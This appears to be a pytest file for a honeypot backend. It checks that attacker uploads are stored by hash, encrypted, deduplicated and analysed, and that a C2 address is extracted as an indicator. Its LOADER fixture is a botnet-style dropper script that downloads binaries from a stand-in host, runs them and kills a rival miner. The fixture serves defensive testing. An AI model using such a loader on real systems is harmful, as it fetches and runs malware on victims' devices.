"""Uploaded files survive ingest, get analysed, and surface as indicators.

Covers the join between the engine's capture and the backend's analysis: an
upload arrives with its bytes, is stored once by hash however many sessions
carry it, is reverse-engineered by the detached stage, and the indicators
inside it are attributed back to the session.
"""

import base64
import hashlib
import os

import pytest
from sqlalchemy import select

from app.models import IndicatorOfCompromise, PayloadSample, SessionArtifact, UserRole
from app.services import artifacts, payload_enrichment

INGEST_HEADERS = {"X-Honeypot-Token": os.environ["HONEYPOT_INGEST_TOKEN"]}

LOADER = (
    b"#!/bin/sh\n"
    b"cd /tmp || cd /var/run\n"
    b"for a in mips mipsel arm x86; do wget http://203.0.113.44/b/$a -O .m; "
    b"chmod +x .m; ./.m; done\n"
    b"pkill -9 kinsing\n"
).strip()


def _upload(content: bytes, filename="update.sh", source="ssh_shell", **extra):
    return {
        "filename": filename,
        "sha256": hashlib.sha256(content).hexdigest(),
        "size": len(content),
        "source": source,
        "content_b64": base64.b64encode(content).decode(),
        **extra,
    }


def _session(uploads, ip="203.0.113.77"):
    return {
        "protocol": "ssh",
        "attacker_ip": ip,
        "attacker_port": 40000,
        "started_at": "2026-02-02T02:02:00Z",
        "status": "completed",
        "duration_seconds": 12.0,
        "commands": ["cd /tmp"],
        "uploads": uploads,
    }


async def _node(client, admin):
    response = await client.post(
        "/api/v1/nodes/", headers=admin,
        json={"name": "edge", "protocol": "ssh", "ip_address": "10.0.0.9", "port": 2222},
    )
    return response.json()["id"]


async def _ingest(client, node_id, session):
    response = await client.post(
        f"/api/v1/sessions/ingest-internal?node_id={node_id}",
        headers=INGEST_HEADERS, json=session,
    )
    assert response.status_code == 200, response.text
    return response.json()


async def test_upload_is_stored_by_hash_and_linked(client, auth_headers, db_session):
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    result = await _ingest(client, node_id, _session([_upload(LOADER)]))
    assert result["uploads_recorded"] == 1

    sample = (await db_session.execute(select(PayloadSample))).scalar_one()
    assert sample.sha256 == hashlib.sha256(LOADER).hexdigest()
    assert sample.content_encrypted is not None
    assert sample.content_encrypted.startswith("v2:")  # AES-256-GCM, encrypted at rest
    assert sample.analysis_status == "pending"

    artifact = (await db_session.execute(select(SessionArtifact))).scalar_one()
    assert artifact.sample_id == sample.id
    assert artifact.source == "ssh_shell"


async def test_same_file_from_two_sessions_is_one_sample(client, auth_headers, db_session):
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    await _ingest(client, node_id, _session([_upload(LOADER)], ip="203.0.113.1"))
    await _ingest(client, node_id, _session([_upload(LOADER)], ip="203.0.113.2"))

    samples = (await db_session.execute(select(PayloadSample))).scalars().all()
    artifacts_rows = (await db_session.execute(select(SessionArtifact))).scalars().all()
    assert len(samples) == 1          # one file...
    assert len(artifacts_rows) == 2   # ...seen in two sessions


async def test_corrupt_content_is_dropped_but_metadata_kept(client, auth_headers, db_session):
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    upload = _upload(LOADER)
    upload["content_b64"] = base64.b64encode(b"different bytes").decode()  # hash won't match
    await _ingest(client, node_id, _session([upload]))

    sample = (await db_session.execute(select(PayloadSample))).scalar_one()
    assert sample.content_encrypted is None
    assert sample.analysis_status == "metadata_only"


async def test_detached_analysis_attributes_indicators_to_the_session(
    client, auth_headers, db_session
):
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    result = await _ingest(client, node_id, _session([_upload(LOADER)]))
    session_id = result["session_id"]

    # Run the stage the endpoint scheduled, directly, so the test is
    # deterministic rather than racing a background task.
    sample = (await db_session.execute(select(PayloadSample))).scalar_one()
    await payload_enrichment.analyse_sample(db_session, sample.id)

    refreshed = (
        await db_session.execute(select(PayloadSample).where(PayloadSample.id == sample.id))
    ).scalar_one()
    assert refreshed.analysis_status == "complete"
    assert refreshed.file_kind == "script"
    assert refreshed.analysis["indicator_count"] >= 1

    iocs = (
        await db_session.execute(
            select(IndicatorOfCompromise).where(IndicatorOfCompromise.session_id == session_id)
        )
    ).scalars().all()
    values = {i.value for i in iocs}
    assert "203.0.113.44" in values  # the C2 from inside the payload
    assert any("payload" in (i.tags or []) for i in iocs)

    artifact = (await db_session.execute(select(SessionArtifact))).scalar_one()
    assert artifact.iocs_recorded is True


async def test_analysis_is_not_repeated_for_a_known_sample(client, auth_headers, db_session):
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    await _ingest(client, node_id, _session([_upload(LOADER)]))
    sample = (await db_session.execute(select(PayloadSample))).scalar_one()
    await payload_enrichment.analyse_sample(db_session, sample.id)
    first_analysed_at = sample.analysed_at

    # A second session with the same file must not re-queue analysis.
    result = await _ingest(client, node_id, _session([_upload(LOADER)], ip="203.0.113.9"))
    pending = await artifacts.record_uploads(db_session, result["session_id"], [_upload(LOADER)])
    assert pending == []
    assert sample.analysed_at == first_analysed_at


async def test_oversize_upload_is_metadata_only(client, auth_headers, db_session, monkeypatch):
    from app.core.config import get_settings

    monkeypatch.setattr(get_settings(), "PAYLOAD_MAX_STORE_BYTES", 16)
    admin = await auth_headers(UserRole.ADMIN)
    node_id = await _node(client, admin)
    await _ingest(client, node_id, _session([_upload(LOADER)]))

    sample = (await db_session.execute(select(PayloadSample))).scalar_one()
    assert sample.content_encrypted is None
    assert sample.size == len(LOADER)  # the hash and size are still recorded
